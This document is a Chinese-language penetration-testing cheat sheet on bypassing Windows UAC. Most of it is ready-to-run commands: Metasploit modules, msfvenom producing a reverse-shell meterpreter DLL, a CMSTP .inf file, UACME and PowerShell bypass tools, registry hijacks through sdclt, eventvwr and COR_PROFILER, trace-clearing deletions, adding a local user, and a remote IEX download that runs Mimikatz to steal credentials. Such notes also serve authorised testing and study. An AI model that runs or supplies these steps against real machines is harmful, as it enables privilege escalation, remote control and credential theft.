  #### MSF
	>use exploit/windows/local/bypassuac 
	>use exploit/windows/local/bypassuac_injection
	>use exploit/windows/local/bypassuac_vbs
	>use exploit/windows/local/bypassuac_fodhelper
	>use exploit/windows/local/bypassuac_eventvwr
	>use exploit/windows/local/bypassuac_comhijack
  #### DccwBypassUAC
	Use on win10&win8
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/105.png)
  #### K8uac
	>k8uac.exe xx.exe
	>k8uac.exe "command"
  #### CMSTP
	设置UAC和Applocker规则
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/106.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/107.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/108.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/109.png)

	MSF生成恶意DLL传入靶机
	>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12138 -f dll -o /var/www/html/cm.dll
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/110.png)

	DLL同目录下建立run.inf，RegisterOCXSection指定dll位置，也可以指定远程webdav
	如：\\192.168.0.107\webdav\cm.dll
	[version]
	Signature=$chicago$
	AdvancedINF=2.5
	[DefaultInstall_SingleUser]
	RegisterOCXs=RegisterOCXSection
	[RegisterOCXSection]
	C:\Users\y.SUB2K8\Desktop\cm.dll
	[Strings]
	AppAct = "SOFTWARE\Microsoft\Connection Manager"
	ServiceName="cmstp"
	ShortSvcName="cmstp"
	执行命令可绕过UAC和Applocker上线
	>cmstp /s run.inf
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/111.png)
  #### Uacme
	包括DLL劫持，COM劫持等50多种bypass方法
	https://github.com/hfiref0x/UACME
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/112.png)

	使用visual studio编译
	Visual Studio 2013v120；
	Visual Studio 2015v140；
	Visual Studio 2017v141;
	Visual Studio 2019v142。
	目前共59种bypassuac方式
	执行方法是
	>akagi.exe 1
	>akagi.exe 1 c:\windows\system32\cmd.exe
	>akagi.exe 1 "net user 1 1 /add"
	注意：
	方式5，9会对目标安全性产生影响，谨慎使用，5需重启
	方式6从win8开始在x64上不可用
	方式11，54只支持x32 
	方式13，19，30，50只支持x64
	方式14需要进程注入，x64要使用x64的工具
  #### Bypass-UAC
	https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC
	>Bypass-UAC -Method UacMethodSysprep
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/113.png)

	Method:
	UacMethodSysprep
	ucmDismMethod
	UacMethodMMC2
	UacMethodTcmsetup
	UacMethodNetOle32
  #### DLL hijack
	程序运行，调用DLL的流程
	1.程序所在目录
	2.系统目录即 SYSTEM32 目录
	3.16位系统目录即 SYSTEM 目录
	4.Windows目录
	5.加载 DLL 时所在的当前目录
	6.PATH环境变量中列出的目录
	使用
	https://docs.microsoft.com/zh-cn/sysinternals/downloads/sigcheck
	检查一个程序的是否以高权限执行
	>sigcheck.exe -m c:\1.exe
	查看autoElevate是否为true
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/114.png)

	使用process monitor查看对应程序执行时调用的DLL情况，查找DLL不在
	HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs列表中，并且所在文件夹当前用户可读写，接下来生成恶意dll备份原DLL替换，再运行此程序即可劫持成功。
  #### SilentCleanup
	>reg add hkcu\Environment /v windir /d "cmd /K reg delete hkcu\Environment /v windir /f && REM "
	>schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
  #### Sdclt
	win10
  ##### 1
	>reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /t REG_SZ /d %COMSPEC% /f 获得管理员权限
	>sdclt 弹出cmd
	>reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /f 清除痕迹
  ##### 2
	https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-SDCLTBypass.ps1
	>Invoke-SDCLTBypass -Command "c:\windows\system32\cmd.exe /c C:\Windows\regedit.exe"
	>sdclt.exe /KickOffElev
  #### Makecab&Wusa
	复制文件出错时
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/115.png)

	>makecab PsExec64.exe C:\Users\y.ZONE\Desktop\ps.cab
	>wusa C:\Users\y.ZONE\Desktop\ps.cab /extract:C:\Windows\system32\
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/116.png)
  #### CLR BypassUAC
	Tested on win10 x64
	生成dll传入受控机temp目录，以下保存为1.bat执行。
	REG ADD "HKCU\Software\Classes\CLSID\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\InprocServer32" /ve /t REG_EXPAND_SZ /d "C:\Temp\test.dll" /f
	REG ADD "HKCU\Environment" /v "COR_PROFILER" /t REG_SZ /d "{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}" /f
	REG ADD "HKCU\Environment" /v "COR_ENABLE_PROFILING" /t REG_SZ /d "1" /f
	REG ADD "HKCU\Environment" /v "COR_PROFILER_PATH" /t REG_SZ /d "C:\Temp\test.dll" /f
	受控机执行gpedit.msc或eventvwr等高权限.net程序时可劫持成功。
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/117.png)

	执行后
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/118.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/119.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/120.png)
#### eventvwr劫持注册表
	打开ProcessMonitor，启动eventvwr，ctrl+T打开进程树，选择进程转到事件
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/121.png)

	右键选择包括eventvwr.exe
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/122.png)

	只选择显示注册表活动
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/123.png)

	添加一条过滤器，显示not found文件
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/124.png)

	找到相应的注册表位置
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/125.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/126.png)

	值修改为
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/127.png)

	MSF监听，再次打开eventvwr
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/128.png)
#### Web Delivery
	>use exploit/multi/script/web_delivery
	>set target 3
	>set payload windows/x64/meterpreter/reverse_tcp
	>exploit
	>use auxiliary/server/regsvr32_command_delivery_server
	>set cmd ipconfig
	>use exploit/windows/misc/regsvr32_applocker_bypass_server
#### Invoke-PsUACme
	method="sysprep","oobe","ActionQueue","migwiz","cliconfg","winsat","mmc"
	>Invoke-PsUACme -method oobe -Payload "c:\user\a\desktop\x.exe"
	需指定绝对路径
	>Invoke-PsUACme -method oobe -Payload "powershell -w hidden -e xxxxxx"
	>Invoke-PsUACme -Payload "powershell -noexit IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/powersploit/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz"
	MSFVENOM生成psh-reflection格式脚本
	>Invoke-PsUACme –Payload "powershell c:\1.ps1"
